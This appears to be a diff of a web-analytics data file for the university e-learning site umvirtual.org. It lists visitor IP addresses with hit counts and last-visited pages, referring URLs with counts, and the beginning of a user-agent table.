+/wp-admin/admin-ajax.php
+189.175.96.132
+0 25 19 1281314 2 1428145108 0 0
+/proiectum/educacion/
+64.233.173.243
+0 1 1 13988 0 0 0 0
+-
+173.252.88.87
+0 3 3 7785 1 1428145108 0 0
+/proiectum/educacion/
+190.232.113.59
+0 1 1 78883 0 0 0 0
+-
+201.166.240.61
+0 99 99 4116352 1 1427991081 0 0
+/wp-admin/admin-ajax.php
+190.127.232.53
+0 1 0 20571 0 0 0 0
+-
+181.66.61.61
+0 2 2 79112 0 0 0 0
+-
+157.55.39.200
+0 45 22 2069557 25 1428284126 0 0
+-
+208.88.224.203
+0 1 1 8158 1 1428063707 0 0
+/
+200.85.30.44
+0 1 1 78883 0 0 0 0
+-
+181.240.21.156
+0 1 0 20571 0 0 0 0
+-
+188.165.15.19
+0 1 1 1887 0 0 0 0
+-
+107.153.7.36
+0 5 2 10689 1 1427951717 0 0
+/wp-login.php
+200.160.6.137
+0 2 2 34677 2 1428256169 0 0
+/
+54.144.51.177
+0 51 51 343880 1 1428083855 0 0
+/
+65.55.212.75
+0 1 1 842 0 0 0 0
+-
+178.162.216.32
+0 78 78 5445364 1 1428139679 0 0
+/
+180.76.4.242
+0 1 1 34395 1 1428022085 0 0
+/
+157.55.39.247
+0 53 37 2731746 25 1428272677 0 0
+/
+186.116.223.13
+0 86 86 978188 1 1427922023 0 0
+/wp-admin/admin-ajax.php
+181.66.157.17
+0 1 1 78883 0 0 0 0
+-
+190.221.141.16
+0 1 0 20571 0 0 0 0
+-
+181.66.184.46
+0 1 1 78883 0 0 0 0
+-
+187.237.25.39
+0 6 0 123678 0 0 0 0
+-
+204.155.149.26
+0 1 1 34432 1 1428234531 0 0
+/
+201.143.77.34
+0 93 93 4092531 1 1427886224 0 0
+/wp-admin/admin-ajax.php
+200.76.91.31
+0 12 12 141857 0 0 0 0
+-
+66.249.93.169
+0 1 1 171494 0 0 0 0
+-
+173.252.114.118
+0 4 4 1722304 0 0 0 0
+-
+186.64.235.204
+0 1 0 20515 0 0 0 0
+-
+201.226.8.148
+0 87 87 1060449 1 1428146950 0 0
+/wp-admin/admin-ajax.php
+180.76.6.134
+0 2 2 8976 2 1427891038 0 0
+/
+66.249.93.173
+0 2 1 28730 1 1428039518 0 0
+/
+69.197.186.210
+0 14 4 48106 2 1428224531 0 0
+/evangelismo-tecnologico/
+200.120.203.232
+0 1 1 78883 0 0 0 0
+-
+200.54.85.148
+0 106 106 1174733 1 1427902054 0 0
+/wp-admin/admin-ajax.php
+104.255.67.238
+0 4 4 68554 1 1428128694 0 0
+/admision/
+123.125.71.53
+0 1 1 8121 1 1427942741 0 0
+/
+180.76.5.74
+0 2 0 838 2 1428205372 0 0
+/
+190.42.122.107
+0 1 1 40080 0 0 0 0
+-
+177.232.50.170
+0 1 0 20571 0 0 0 0
+-
+54.86.207.203
+0 3 3 39342 0 0 0 0
+-
+180.76.6.37
+0 1 1 8118 1 1428099136 0 0
+/
+180.76.5.25
+0 1 0 324 1 1428077591 0 0
+/portfolio/tecnicas-de-ventas-efectivas/
+181.54.169.138
+0 2 0 41142 0 0 0 0
+-
+78.85.143.170
+0 1 1 379 1 1428259926 0 0
+/wp-admin/admin-post.php
+180.76.6.141
+0 1 1 8120 1 1428045900 0 0
+/
+190.239.242.118
+0 2 2 157766 0 0 0 0
+-
+131.216.48.254
+0 97 97 4234102 1 1427887578 0 0
+/wp-admin/admin-ajax.php
+187.152.146.104
+0 163 163 9020388 1 1428060167 0 0
+/wp-admin/admin-ajax.php
+66.220.158.118
+0 4 3 362902 0 0 0 0
+-
+190.234.106.238
+0 1 1 68973 0 0 0 0
+-
+187.209.11.147
+0 1 1 78883 0 0 0 0
+-
+173.252.100.117
+0 1 1 184569 0 0 0 0
+-
+187.253.97.123
+0 1 1 78883 0 0 0 0
+-
+189.187.134.111
+0 147 147 5911794 1 1428007264 0 0
+/wp-admin/admin-ajax.php
+66.249.88.199
+0 1 0 20571 0 0 0 0
+-
+14.205.146.252
+0 27 1 20441 1 1428050908 0 0
+-
+201.175.173.46
+0 86 85 909113 1 1428225476 0 0
+/wp-admin/admin-ajax.php
+74.88.108.28
+0 1 1 68633 0 0 0 0
+-
+189.136.30.71
+0 1 1 78883 0 0 0 0
+-
+190.42.87.186
+0 1 1 78883 0 0 0 0
+-
+180.76.6.231
+0 1 1 7538 1 1427905490 0 0
+/portfolio/orientacion-familiar/
+198.27.69.229
+0 1 1 8157 1 1428013377 0 0
+/
+202.46.61.43
+0 1 1 8122 1 1428138547 0 0
+/
+181.66.156.106
+0 2 0 41142 0 0 0 0
+-
+123.125.71.26
+0 1 1 8119 1 1427882139 0 0
+/
+180.76.6.157
+0 2 2 8711 1 1427958117 0 0
+/category/tecnologia/
+201.183.99.71
+0 10 10 48397 0 0 0 0
+-
+109.201.154.163
+0 3 3 50040 1 1427952808 0 0
+/disfrutar-y-aprender-mas-en-plataformas-de-e-learning/
+187.161.168.166
+0 2 0 41146 0 0 0 0
+-
+189.133.220.40
+0 160 160 6960200 1 1427903542 0 0
+/wp-admin/admin-ajax.php
+181.64.209.12
+0 1 0 20570 0 0 0 0
+-
+200.76.91.132
+0 7 7 606303 0 0 0 0
+-
+190.39.83.122
+0 1 1 78883 0 0 0 0
+-
+104.176.153.68
+0 203 201 5781301 1 1428089210 0 0
+/wp-admin/admin-ajax.php
+220.181.108.120
+0 2 2 16238 2 1427957447 0 0
+/
+173.252.120.112
+0 2 2 157766 0 0 0 0
+-
+189.151.236.230
+0 159 159 6171455 1 1428009751 0 0
+/wp-admin/admin-ajax.php
+66.220.158.112
+0 4 1 120467 0 0 0 0
+-
+190.233.235.119
+0 2 2 157766 0 0 0 0
+-
+186.70.245.242
+0 1 0 20571 0 0 0 0
+-
+199.21.99.195
+0 15 7 93748 3 1428263278 0 0
+/
+173.252.73.117
+0 1 1 78883 0 0 0 0
+-
+190.56.253.123
+0 1 1 78883 0 0 0 0
+-
+191.78.33.196
+0 3 0 61713 0 0 0 0
+-
+180.76.5.188
+0 1 0 404 1 1427891038 0 0
+-
+194.187.168.23
+0 2 2 9042 1 1427888523 0 0
+/portfolio/responsabilidades-parentales/
+189.177.186.92
+0 93 93 3601782 1 1428100479 0 0
+/wp-admin/admin-ajax.php
+65.55.215.33
+0 2 2 80752 0 0 0 0
+-
+199.58.86.209
+0 2 2 47431 1 1428217155 0 0
+/
+199.180.248.51
+0 2 0 41090 1 1427984001 0 0
+-
+10.7.170.104
+0 6 6 16982 1 1428258892 0 0
+/
+71.20.147.114
+0 167 163 3242469 1 1428019910 0 0
+/wp-admin/admin-ajax.php
+123.125.71.14
+0 1 1 395154 0 0 0 0
+-
+121.41.111.107
+0 1 0 417 1 1428016857 0 0
+-
+65.55.211.212
+0 2 0 41146 0 0 0 0
+-
+157.55.81.9
+0 24 24 182607 0 0 0 0
+-
+181.60.200.157
+0 1 1 78883 0 0 0 0
+-
+180.76.5.20
+0 2 1 7651 2 1428040810 0 0
+/tag/educacion/
+190.96.227.12
+0 1 1 78883 0 0 0 0
+-
+10.16.238.208
+0 90 90 4086633 1 1427885043 0 0
+/
+187.142.78.219
+0 1 0 20571 0 0 0 0
+-
+189.132.228.120
+0 96 96 1082406 1 1428270751 0 0
+/wp-admin/admin-ajax.php
+200.76.83.22
+0 15 15 190668 0 0 0 0
+-
+46.219.243.109
+0 2 1 2005 1 1428170788 0 0
+/
+181.65.84.216
+0 2 2 157766 0 0 0 0
+-
+128.177.161.190
+0 1 0 20571 0 0 0 0
+-
+189.191.64.214
+0 1 1 78883 0 0 0 0
+-
+208.80.194.123
+0 1 1 34354 1 1428256247 0 0
+/
+195.210.29.8
+0 1 1 245 1 1428230804 0 0
+/
+180.76.5.144
+0 3 3 26340 2 1428191641 0 0
+/
+173.252.114.112
+0 1 1 652657 0 0 0 0
+-
+201.165.182.134
+0 1 1 171494 0 0 0 0
+-
+186.29.57.0
+0 1 1 110194 0 0 0 0
+-
+190.56.12.183
+0 2 2 79112 0 0 0 0
+-
+180.76.6.158
+0 2 1 7084 1 1427947229 0 0
+/tag/tecnologia/
+181.72.98.110
+0 1 1 78883 0 0 0 0
+-
+186.101.188.11
+0 1 0 20571 0 0 0 0
+-
+189.218.180.169
+0 75 75 3138704 1 1428278859 0 0
+/wp-admin/admin-ajax.php
+52.0.88.41
+0 1 1 229 0 0 0 0
+-
+208.80.194.122
+0 3 3 103062 3 1428173694 0 0
+/
+95.129.152.247
+0 1 0 20819 0 0 0 0
+-
+200.4.213.203
+0 2 2 157766 0 0 0 0
+-
+200.76.83.237
+0 5 5 214532 0 0 0 0
+-
+187.205.212.84
+0 43 43 298310 1 1428096457 0 0
+/
+189.234.197.234
+0 2 2 157766 0 0 0 0
+-
+201.132.46.147
+0 1 0 20571 0 0 0 0
+-
+178.250.53.99
+0 29 25 548776 1 1427959745 0 0
+/wp-login.php
+181.182.145.179
+0 3 3 157994 0 0 0 0
+-
+123.125.71.45
+0 1 1 34395 1 1427877457 0 0
+/
+186.43.81.5
+0 56 56 1325871 1 1427879915 0 0
+/
+201.152.178.65
+0 73 71 485115 1 1428005028 0 0
+/wp-admin/admin-ajax.php
+190.137.90.15
+0 86 86 1051909 1 1427932751 0 0
+/wp-admin/admin-ajax.php
+192.0.86.133
+0 1 1 245 1 1427982865 0 0
+/
+200.104.48.220
+0 1 0 20571 0 0 0 0
+-
+66.249.65.149
+0 181 96 1403594 29 1428285703 0 0
+-
+173.252.100.118
+0 3 1 10194 0 0 0 0
+-
+189.163.239.63
+0 189 188 9557033 1 1428262404 0 0
+/wp-admin/admin-ajax.php
+187.194.187.209
+0 97 97 4242108 1 1428270343 0 0
+/wp-admin/admin-ajax.php
+187.178.249.230
+0 1 0 20573 0 0 0 0
+-
+123.125.68.10
+0 1 1 36705 0 0 0 0
+-
+201.157.87.20
+0 1 0 20571 0 0 0 0
+-
+182.118.21.205
+0 1 1 8157 1 1428071225 0 0
+/
+220.181.108.182
+0 1 0 20538 0 0 0 0
+-
+190.199.148.230
+0 1 0 20571 0 0 0 0
+-
+187.137.99.220
+0 1 0 20571 0 0 0 0
+-
+186.115.62.62
+0 2 0 41141 0 0 0 0
+-
+201.157.91.90
+0 2 0 21031 0 0 0 0
+-
+180.76.5.65
+0 3 3 15034 3 1428263993 0 0
+/portfolio/responsabilidades-parentales/
+181.92.10.21
+0 105 105 5361493 1 1428163099 0 0
+/wp-admin/admin-ajax.php
+201.140.81.74
+0 20 3 86063 0 0 0 0
+-
+123.125.71.15
+0 1 1 34395 1 1427882173 0 0
+/
+213.136.86.142
+0 1 1 245 1 1428104332 0 0
+/
+180.76.6.152
+0 2 1 8590 2 1428221382 0 0
+/author/lorena/
+189.193.211.77
+0 1 0 20571 0 0 0 0
+-
+123.125.71.101
+0 2 2 16245 2 1428226642 0 0
+/
+186.2.19.132
+0 1 0 20571 0 0 0 0
+-
+190.65.64.162
+0 1 0 20571 0 0 0 0
+-
+187.160.196.8
+0 95 95 4102364 1 1427912288 0 0
+/wp-admin/admin-ajax.php
+180.76.6.65
+0 2 2 19514 2 1428214697 0 0
+/author/caty/
+180.76.5.57
+0 1 1 6546 1 1428137215 0 0
+/author/caty/
+190.208.103.145
+0 1 1 78883 0 0 0 0
+-
+190.236.177.81
+0 2 2 157654 0 0 0 0
+-
+181.174.59.162
+0 1 1 78883 0 0 0 0
+-
+189.152.50.255
+0 131 131 2954437 1 1427894930 0 0
+/wp-admin/admin-ajax.php
+186.218.251.35
+0 98 98 4467153 1 1427982734 0 0
+/wp-admin/admin-ajax.php
+187.156.134.131
+0 1 0 20571 0 0 0 0
+-
+190.197.90.52
+0 1 0 20571 0 0 0 0
+-
+52.4.135.197
+0 1 1 229 0 0 0 0
+-
+187.138.25.49
+0 1 0 20571 0 0 0 0
+-
+173.208.87.146
+0 1 1 8158 1 1428001713 0 0
+/
+68.203.255.183
+0 103 103 4257848 1 1428093069 0 0
+/wp-admin/admin-ajax.php
+180.76.4.138
+0 1 1 34395 1 1428079458 0 0
+/
+187.212.230.214
+0 87 87 1053254 1 1428180663 0 0
+/wp-admin/admin-ajax.php
+180.76.5.73
+0 1 0 404 0 0 0 0
+-
+123.125.71.23
+0 3 2 63050 1 1428082530 0 0
+/
+179.52.26.154
+0 87 87 979480 1 1427903781 0 0
+/wp-admin/admin-ajax.php
+187.212.16.169
+0 108 108 4313630 1 1427879198 0 0
+/wp-admin/admin-ajax.php
+198.167.248.28
+0 1 1 78883 0 0 0 0
+-
+180.76.5.193
+0 1 1 8121 1 1428168097 0 0
+/
+189.221.231.234
+0 74 74 2962372 1 1428189663 0 0
+/wp-admin/admin-ajax.php
+173.252.74.114
+0 1 1 78883 0 0 0 0
+-
+191.183.230.196
+0 96 96 4885461 1 1428013278 0 0
+/wp-admin/admin-ajax.php
+178.255.215.93
+0 5 2 25314 3 1428187064 0 0
+-
+77.247.181.165
+0 51 51 343880 1 1428150086 0 0
+/
+104.154.16.46
+0 19 19 162505 1 1428108715 0 0
+/
+201.137.166.162
+0 87 87 1060444 1 1428098856 0 0
+/wp-admin/admin-ajax.php
+187.167.44.75
+0 89 89 1063103 1 1427929446 0 0
+/wp-admin/admin-ajax.php
+189.144.30.184
+0 1 1 77900 0 0 0 0
+-
+189.190.179.21
+0 1 1 16369 0 0 0 0
+-
+180.76.6.52
+0 2 2 12060 2 1428249496 0 0
+/tag/investigacion/
+220.181.108.109
+0 1 1 21857 0 0 0 0
+-
+189.165.221.222
+0 2 0 41142 0 0 0 0
+-
+187.147.55.61
+0 102 101 4251658 1 1428095414 0 0
+/wp-admin/admin-ajax.php
+189.203.218.250
+0 1 1 12626 1 1428003280 0 0
+/portfolio/teologia/
+201.175.158.79
+0 1 1 78883 0 0 0 0
+-
+107.170.72.240
+0 1 0 20571 0 0 0 0
+-
+66.249.83.162
+0 5 4 77123 4 1428260083 0 0
+/feed/
+173.252.101.119
+0 1 1 78883 0 0 0 0
+-
+65.55.157.206
+0 6 6 24827 0 0 0 0
+-
+177.68.159.135
+0 1 1 8121 1 1427942747 0 0
+/
+95.61.186.49
+0 1 0 20571 0 0 0 0
+-
+187.24.90.40
+0 25 25 188017 1 1427881229 0 0
+/
+186.103.168.99
+0 1 0 20571 0 0 0 0
+-
+180.76.4.57
+0 1 0 285 1 1428036941 0 0
+/
+180.76.5.69
+0 2 2 10846 2 1428279405 0 0
+/
+94.131.14.7
+0 1 0 20498 1 1428062492 0 0
+-
+200.76.91.208
+0 1 1 8134 0 0 0 0
+-
+189.188.154.20
+0 105 105 4216340 1 1427891603 0 0
+/wp-admin/admin-ajax.php
+# End Of Table - sites (monthly)
+# -sites- (daily)
+66.249.73.141
+0 2 0 950 1 1428279835 0 0
+-
+201.141.91.93
+0 1 1 40080 0 0 0 0
+-
+66.249.73.210
+0 2 0 882 1 1428282684 0 0
+-
+194.187.168.22
+0 2 2 8426 1 1428282490 0 0
+/tag/e-learning/
+66.201.161.243
+0 1 0 20571 0 0 0 0
+-
+94.228.34.210
+0 3 2 52902 1 1428284416 0 0
+/feed/atom/
+208.80.194.29
+0 2 0 41092 1 1428287234 0 0
+-
+78.46.203.72
+0 3 3 103128 1 1428280292 0 0
+/
+66.249.65.153
+0 11 5 65417 2 1428288677 0 0
+/portfolio/quiero-vivir-sano-8-habitos-saludables/
+190.238.235.113
+0 1 1 171494 0 0 0 0
+-
+172.16.254.8
+0 1 1 177 1 1428285915 0 0
+/wp-cron.php
+187.189.149.219
+0 97 97 4114504 1 1428282447 0 0
+/wp-admin/admin-ajax.php
+66.249.73.218
+0 1 0 441 0 0 0 0
+-
+198.228.90.228
+0 2 2 79111 0 0 0 0
+-
+185.31.136.59
+0 1 0 285 1 1428282636 0 0
+/
+180.76.5.23
+0 1 0 404 1 1428279514 0 0
+/
+207.46.13.135
+0 2 1 8692 2 1428287937 0 0
+/
+91.238.82.229
+0 1 0 20495 1 1428279277 0 0
+-
+208.87.233.180
+0 1 1 34376 1 1428280877 0 0
+/
+66.249.65.145
+0 5 1 29174 2 1428288012 0 0
+-
+187.152.177.74
+0 1 0 20571 0 0 0 0
+-
+180.76.5.173
+0 1 0 300 1 1428284544 0 0
+/author/leticia/
+199.58.86.206
+0 2 2 47431 1 1428285289 0 0
+/
+119.63.196.125
+0 1 1 8120 1 1428285914 0 0
+/
+180.76.5.22
+0 1 0 404 0 0 0 0
+-
+180.76.6.140
+0 1 1 620 0 0 0 0
+-
+54.159.217.51
+0 1 1 8157 1 1428288986 0 0
+/
+52.5.114.51
+0 7 0 1862 1 1428283876 0 0
+/
+180.76.4.64
+0 1 0 404 1 1428279102 0 0
+/
+119.63.196.126
+0 1 0 404 0 0 0 0
+-
+189.172.168.216
+0 87 87 1060444 1 1428285793 0 0
+/wp-admin/admin-ajax.php
+187.148.95.193
+0 1 0 20571 0 0 0 0
+-
+98.255.90.24
+0 6 6 25049 0 0 0 0
+-
+180.76.6.21
+0 1 1 6443 1 1428284545 0 0
+/author/leticia/
+66.249.65.176
+0 1 0 441 0 0 0 0
+-
+207.46.13.101
+0 2 0 41159 1 1428281963 0 0
+-
+5.9.151.67
+0 103 102 755619 1 1428282267 0 0
+/tag/virtual/
+66.249.73.245
+0 1 0 591 1 1428279834 0 0
+-
+66.249.65.172
+0 1 0 441 1 1428278435 0 0
+/
+180.76.6.213
+0 1 1 8123 1 1428279514 0 0
+/
+66.249.73.202
+0 3 0 1323 1 1428281833 0 0
+-
+157.55.39.200
+0 1 0 583 1 1428284126 0 0
+-
+189.218.180.169
+0 75 75 3138704 1 1428278859 0 0
+/wp-admin/admin-ajax.php
+66.249.65.149
+0 6 1 90319 2 1428285703 0 0
+-
+201.140.81.74
+0 7 1 82561 0 0 0 0
+-
+190.236.177.81
+0 2 2 157654 0 0 0 0
+-
+180.76.5.69
+0 1 1 8121 1 1428279405 0 0
+/
+# End Of Table - sites (daily)
+# -referrers- 
+http://umvirtual.org/images/orando.jpg
+0 54
+http://umvirtual.org/category/tecnologia/
+0 2
+http://www.um.edu.mx/carreras/fapsi/psicologia-clinica/
+0 2
+http://www.um.edu.mx/carreras/facultad-de-teologia/
+0 2
+http://umvirtual.org/mi-cuenta/
+0 40
+http://umvirtual.org/portfolio/atencion-y-servicio-al-cliente/
+0 5
+http://umvirtual.org/educacion-continua/
+0 1130
+http://umvirtual.org/acerca-de-la-e42/
+0 6
+http://www.um.edu.mx/experiencia-um/
+0 1
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/medico-cirujano/
+0 1
+http://umvirtual.org/autofinanciamiento.html
+0 1
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/terapia-fisica-y-rehabilitacion/
+0 2
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/salud-publica-medicina-preventiva/
+0 1
+http://nym1.ib.adnxs.com/if
+0 2
+http://www.um.edu.mx/carreras/prepa/nivel-medio-superior/
+0 1
+http://umvirtual.org/cursos-cortos/
+0 1020
+http://umvirtual.org/autofinanciamiento
+0 1
+http://umvirtual.org/autofinanciamiento/
+0 80
+http://www.um.edu.mx/ciencias-de-la-salud/
+0 1
+http://umvirtual.org/portfolio/orientacion-familiar/
+0 136
+http://umvirtual.org/robots.txt
+0 2
+http://www.um.edu.mx/
+0 57
+http://semalt.semalt.com/crawler.php
+0 1
+https://www.google.com.do/
+0 7
+http://umvirtual.org/portfolio/plan-estrategico-de-desarrollo/
+0 9
+http://hvd-store.com/
+0 2
+http://www.google.cl/url
+0 1
+https://www.google.com.mx/
+0 116
+http://www.google.com/url
+0 8
+http://umvirtual.org/images/salud-evangelismo.jpg
+0 1
+http://umvirtual.org/images/sexualidad.jpg
+0 53
+http://umvirtual.org/portfolio/fundamento-desarrollo-y-alcance-del-sistema-educativo-adventista/
+0 7
+http://www.um.edu.mx/contacto/
+0 1
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/quimico-clinico-biologo/
+0 2
+https://www.google.cl/
+0 49
+http://umvirtual.org/portfolio/quiero-vivir-sano-8-habitos-saludables/
+0 177
+http://www.google.com.ar/imgres
+0 1
+http://umvirtual.org/eyeblaster/addineyeV2.html
+0 70
+http://umvirtual.org/proiectum/educacion/
+0 124
+http://www.um.edu.mx/publicos/alumnos/
+0 3
+http://umvirtual.org/Portafolio-promotores-salud.html
+0 107
+http://umvirtual.org/portfolio/diplomado-en-instituciones-educativas/
+0 12
+http://domainsigma.com/whois/umvirtual.org
+0 1
+http://www.google.com/search
+0 1
+https://www.google.com.br/
+0 9
+http://www.um.edu.mx/investigacion/descargas/
+0 1
+http://umvirtual.org/portfolio/orientacion-profetica/
+0 145
+http://umvirtual.org/portfolio/plan-de-marketing/
+0 72
+http://buttons-for-website.com
+0 2
+http://umvirtual.org/wp-content/themes/inceptio/style.css
+0 2210
+http://umvirtual.org/pregrado/
+0 357
+http://www.google.com.mx/search
+0 4
+http://umvirtual.org/portfolio/maestria-en-relaciones-familiares/
+0 167
+http://www.um.edu.mx/carreras/faced/maestria-en-mercadotecnia/
+0 1
+https://www.google.com.pe/
+0 75
+http://umvirtual.org/index.html
+0 72
+http://umvirtual.org/portfolio/la-educacion-adventista-en-el-ambiente-contemporaneo/
+0 2
+https://www.google.co.ve/
+0 18
+http://www.google.com.ar/blank.html
+0 8
+http://umvirtual.org/portfolio/maestria-en-finanzas/
+0 77
+https://www.google.com.bo/
+0 3
+http://umvirtual.org/portfolio/promocion-vida-saludable/
+0 21
+http://www.um.edu.mx/carreras/faced/ciencias-sociales/
+0 1
+http://r.search.yahoo.com/_ylt
+0 6
+https://www.facebook.com/
+0 1
+http://www.um.edu.mx/admision/costos/
+0 9
+http://www.google.com/blank.html
+0 8
+http://umvirtual.org/
+0 14877
+http://umvirtual.org/portfolio/curso-de-induccion/
+0 1
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/enfermeria/
+0 2
+http://start.iminent.com/es-ES/search/
+0 1
+http://umvirtual.org/portfolio/fundamentos-firmes-para-la-familia-contemporanea/
+0 2
+http://www.um.edu.mx/carreras/faced/maestria-en-gestion-educativa/
+0 1
+http://umvirtual.org/wp-content/themes/inceptio/css/shortcodes.css
+0 428
+http://umvirtual.org/portfolio/formacion-en-tutoria-virtual/
+0 52
+http://t.co/75xmQRYOWZ
+0 3
+http://www.um.edu.mx/carreras/artes-y-comunicacion/diseno-de-comunicacion-visual/
+0 2
+http://umvirtual.org/acerca/modelo-educativo/
+0 15
+http://www.google.fr/url
+0 1
+http://umvirtual.org/salud-mental-y-bienestar-personal
+0 50
+https://www.google.co.cr/
+0 2
+https://www.google.com/
+0 23
+- (Direct Request)
+0 4411
+http://e42.um.edu.mx/lite/sec/default.aspx
+0 9
+http://www.um.edu.mx/admision/maestrias/
+0 2
+http://umvirtual.org/admision/
+0 112
+http://www.um.edu.mx/carreras/faced/doctorado-en-gestion-educativa/
+0 2
+http://umvirtual.org/portfolio/consejeria-familiar-dinamica-familiar/
+0 6
+http://www.um.edu.mx/carreras/fapsi/doctorado-en-educacion-familiar/
+0 2
+http://umvirtual.org/feed/
+0 7
+http://umvirtual.org/portfolio/formacion-del-caracter/
+0 3
+http://umvirtual.us7.list-manage1.com/subscribe/confirm
+0 1
+http://www.google.com.co/blank.html
+0 3
+http://www.um.edu.mx/admision/requisitos-de-admision/
+0 4
+http://www.google.com.mx/
+0 325
+http://www.google.com.pe/imgres
+0 5
+http://www.bing.com/search
+0 1
+http://www.um.edu.mx/carreras/fapsi/maestria-en-relaciones-familiares-con-acentuacion-en-terapia-familiar/
+0 2
+http://umvirtual.org/articulos/
+0 8
+http://lizandkaren.blogspot.mx/
+0 1
+http://www.google.com.mx/blank.html
+0 2
+http://www.um.edu.mx/carreras/facad/doctorado-en-administracion/
+0 1
+http://umvirtual.org/portfolio/integracion-de-la-fe-en-la-ensenanza/
+0 2
+http://umvirtual.org/portfolio/consejeria-familiar-vida-en-pareja/
+0 70
+http://umvirtual.org/wp-content/themes/inceptio-child/style.css
+0 16
+https://www.google.com.co/
+0 58
+http://umvirtual.org/posgrado/
+0 595
+http://m.facebook.com/
+0 1
+http://www.um.edu.mx/maestria-en-bibliotecologia-y-ciencias-de-la-informacion/
+0 1
+http://umvirtual.org/acerca/
+0 15
+http://umvirtual.org/portfolio/licenciatura-en-administracion-de-empresas/
+0 81
+http://umvirtual.org/portfolio/tecnicas-de-ventas-efectivas/
+0 7
+http://www.um.edu.mx/carreras/
+0 20
+https://www.google.com.pr/
+0 2
+http://umvirtual.org/wp-content/themes/inceptio/css/flexslider.css
+0 6
+http://www.um.edu.mx/carreras/fapsi/psicologia-educativa/
+0 1
+http://umvirtual.org/educacion-formal/
+0 113
+http://umvirtual.org/wp-content/themes/inceptio-child/custom.css
+0 90
+http://www.um.edu.mx/nosotros/modelo-educativo/
+0 1
+http://www.google.com.mx/url
+0 15
+http://umvirtual.org/wp.content
+0 1
+http://www.search.ask.com/web
+0 1
+http://umvirtual.org/portfolio/como-conducir-una-entrevista-de-consejeria/
+0 6
+http://www.umvirtual.org/wp-admin/admin-ajax.php
+0 1
+http://umvirtual.org/portfolio/introduccion-a-la-investigacion/
+0 47
+http://www.google.cl/blank.html
+0 1
+http://umvirtual.org/portfolio/activacion-fisica-para-el-bienestar-personal/
+0 14
+http://umvirtual.org/images/evaPublicoGrande.gif
+0 46
+http://umvirtual.org/wp-admin/
+0 54
+https://www.google.com.ec/
+0 10
+http://e42.um.edu.mx/lite/sec/Default.aspx
+0 36
+http://umvirtual.org/portfolio/sexualidad/
+0 11
+http://umvirtual.org/portfolio/maestria-en-recursos-humanos/
+0 95
+http://www.um.edu.mx/carreras/fit/maestria-en-ciencias-computacionales-ingenieria-de-software/
+0 3
+http://umvirtual.org/mi-cuenta/e42-lite/
+0 49
+http://www.google.com.pe/blank.html
+0 6
+http://umvirtual.org/wp-content/plugins/revslider/rs-plugin/css/settings.css
+0 261
+https://www.google.es/
+0 17
+http://umvirtual.org/portfolio/maestria-en-educacion/
+0 212
+https://www.google.co.kr/
+0 2
+http://www.google.es/blank.html
+0 2
+http://www.google.com.co/search
+0 2
+http://umvirtual.org/wp-content/uploads/saludable.jpg
+0 2
+http://umvirtual.org/acerca/testimonios/
+0 1
+http://umvirtual.org/portfolio/principios-de-hermeneutica/
+0 1
+http://umvirtual.org/portfolio/salud-espiritual-jesus-la-gran-esperanza/
+0 84
+http://umvirtual.org/dios-el-mejor-programador/
+0 108
+http://www.um.edu.mx/nosotros/como-llegar-a-la-um/
+0 1
+http://umvirtual.org/disfrutar-y-aprender-mas-en-plataformas-de-e-learning/
+0 61
+http://best-seo-solution.com/try.php
+0 3
+http://quierovivirsano.org/verano-2014/
+0 3
+http://www.um.edu.mx/nosotros/acerca-de-la-iglesia-adventista/
+0 2
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/esepcialidad-en-gestion-de-enfermeria/
+0 1
+http://images.search.yahoo.com/images/view
+0 1
+https://www.google.com.gt/
+0 4
+http://www.um.edu.mx/carreras/verano-2014/
+0 3
+http://umvirtual.org/wp-login.php
+0 1
+http://umvirtual.org/wp-content/plugins/revslider/rs-plugin/css/rs-custom.css
+0 60
+http://umvirtual.us7.list-manage.com/subscribe/confirm
+0 1
+http://t.co/keWD07JdMa
+0 1
+http://umvirtual.org/portfolio/responsabilidades-parentales/
+0 9
+http://umvirtual.org/portfolio/como-crear-un-centro-de-influencia/
+0 19
+http://umvirtual.org/portfolio/estrategias-de-ensenanza-para-las-nuevas-generaciones/
+0 8
+http://umvirtual.org/portfolio/como-disenar-actividades-que-desarrollan-competencias/
+0 154
+http://www.um.edu.mx/carreras/ciencias-de-la-educacion-2/
+0 2
+http://www.google.com/m
+0 2
+http://www.um.edu.mx/carreras/faced/educacion-primaria/
+0 3
+https://www.google.com.ar/
+0 8
+http://lizandkaren.blogspot.com.ar/
+0 3
+http://umvirtual.org/wp-content/uploads/2012/05/co-op/co-op/co-op/CBIBSWeb.start.html
+0 1
+http://www.umvirtual.org
+0 27
+http://umvirtual.org/portfolio/teologia/
+0 4218
+http://cn.bing.com/images/searchbyimage/
+0 1
+http://www.google.com/
+0 3
+http://www.bing.com/images/search
+0 15
+https://www.google.com.sv/
+0 6
+http://l.facebook.com/l.php
+0 1
+http://umvirtual.org/portfolio/formacion-de-promotores-de-salud-y-evangelismo/
+0 62
+https://www.google.com.uy/
+0 3
+http://umvirtual.org/diplomados/
+0 264
+http://umvirtual.org/portfolio/implementacion-de-programas-de-salud-en-instituciones-educativas/
+0 10
+http://umvirtual.org/contacto/
+0 5
+http://umvirtual.org/evangelismo-tecnologico-spot3
+0 2
+http://umvirtual.org/cursos/
+0 10
+http://umvirtual.org
+0 17
+http://umvirtual.org/portfolio/salud-emocional-y-bienestar-personal/
+0 280
+http://www.google.co.cr/url
+0 1
+http://umvirtual.org/proiectum/educacion/css/styles.css
+0 30
+http://umvirtual.org/portfolio/maestria-en-ciencias-computacionales/
+0 44
+http://www.um.edu.mx/carreras/ciencias-de-la-salud/nutricion-y-dietetica/
+0 3
+http://umvirtual.org/portfolio/teologia-aplicada/
+0 167
+http://umvirtual.org/portfolio/estilo-de-vida-saludable/
+0 469
+https://www.google.com.bz/
+0 1
+http://umvirtual.org/wp-content/themes/inceptio/css/smoothness/jquery-ui-1.10.1.custom.min.css
+0 80
+http://www.um.edu.mx/carreras/facad/maestria-en-finanzas/
+0 3
+http://umvirtual.org/posgrados
+0 54
+# End Of Table - referrers
+# -agents- 
+Dalvik/1.6.0 (Linux; U; Android 4.2.1; Joinet-J90 Build/JOP40D)
+0 2
+Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; LenovoA3300-GV Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 M
+0 88
+the beast
+0 1
